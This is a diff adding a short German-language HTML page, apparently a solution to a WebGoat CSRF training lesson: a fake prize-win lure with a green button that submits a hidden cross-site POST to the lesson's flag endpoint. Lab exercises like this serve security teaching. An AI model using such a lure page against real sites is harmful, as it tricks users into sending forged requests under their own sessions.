@@ -1,0 +1,29 @@
+<!doctype html>
+<html>
+  <head>
+    <title>Gewinnspiel</title>
+  </head>
+  <body>
+    <h1>Glückwunsch! Sie haben gewonnen!</h1>
+    <p>Klicken Sie auf den Button, um Ihren Preis einzulösen:</p>
+
+    <form
+      id="csrfForm"
+      action="http://3.81.144.156:8080/WebGoat/csrf/basic-get-flag"
+      method="POST"
+    >
+      <input
+        type="submit"
+        value="HIER PREIS ABHOLEN"
+        style="
+          padding: 10px 20px;
+          font-size: 16px;
+          background-color: green;
+          color: white;
+          border: none;
+          cursor: pointer;
+        "
+      />
+    </form>
+  </body>
+</html>
